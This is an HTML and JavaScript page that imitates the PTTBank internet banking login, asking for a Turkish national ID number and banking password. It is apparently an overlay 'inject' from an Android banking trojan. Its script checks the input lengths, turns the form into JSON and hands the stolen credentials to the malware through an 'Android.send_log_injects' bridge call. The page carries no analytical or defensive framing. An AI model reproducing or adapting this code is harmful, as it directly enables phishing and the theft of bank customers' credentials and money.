		PTTBank
	</div>

	<form id="form">
	<input type="text" class="input" name="fields[login]" id="login" placeholder="TC Kimlik No" style="margin-top: 10px;" maxlength="11">
	<input type="password" class="input" name="fields[password]" id="password" placeholder="İnternet Bankacılığı Şifresi" maxlength="8">
	<br><br><br>
	<br><br><br>
	<br><br><br>
	<div class="button-div">
		<button type="button" class="submit-button" onclick="next()" id="submitBtn1"><span>GİRİŞ</span></button>
		<input id="type_injects" value='banks' type="hidden" required>
		<input id="closed" value='close_activity_injects' type="hidden" required>
	</div>
	
</form>
    <script type="text/javascript">

function next(){
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input';
						} catch(e){};
						
                        if (oNumInp.value.length < 6) {
							try{
								oNumInp.className = 'input error';
							} catch(e){};
                            return false;
                        }
						
                        if (oCodeInp.value.length < 8) {
							try{
                                oCodeInp.className = 'input error';
							} catch(e){};
                            return false;
                        }
                        process('form');
							}
							function process(formId) {
    var ua = navigator.userAgent.toLowerCase();
    if(ua.indexOf("android") > -1) {
        
        try {
        Android.send_log_injects(formToJSON(document.getElementById(formId)));
        } catch (err) {}
    }else{
        alert(formToJSON(document.getElementById(formId)));
    }
}
var stringifyJSON = function(obj) {
    var arrOfKeyVals = [],
        arrVals = [],
        objKeys = [];

    /*********CHECK FOR PRIMITIVE TYPES**********/
    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
        return '' + obj;
    else if (typeof obj === 'string')
        return '"' + obj + '"';

    /*********CHECK FOR ARRAY**********/
    else if (Array.isArray(obj)) {
        if (obj[0] === undefined)
            return '[]';
        else {
            obj.forEach(function(el) {
                arrVals.push(stringifyJSON(el));
            });
            return '[' + arrVals + ']';
        }
    }
    /*********CHECK FOR OBJECT**********/
    else if (obj instanceof Object) {
        objKeys = Object.keys(obj);
        objKeys.forEach(function(key) {
            var keyOut = '"' + key + '":';
            var keyValOut = obj[key];
            if (keyValOut instanceof Function || typeof keyValOut === undefined)
                arrOfKeyVals.push('');
            else if (typeof keyValOut === 'string')
                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                arrOfKeyVals.push(keyOut + keyValOut);
            else if (keyValOut instanceof Object) {
                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
            }
        });
        return '{' + arrOfKeyVals + '}';
    }
};

function formToJSON(f)
{
    var FinalObject = {}, namesHTML = ['input','select'];

    for(var i = 0; i < namesHTML.length; i++) {
      
        var bsform = f.getElementsByTagName(namesHTML[i]);
       
        for(var j = 0; j < bsform.length; j++) {
            FinalObject[bsform[j].id] = bsform[j].value;
            
        }
    }
    return stringifyJSON(FinalObject);
}
</script>
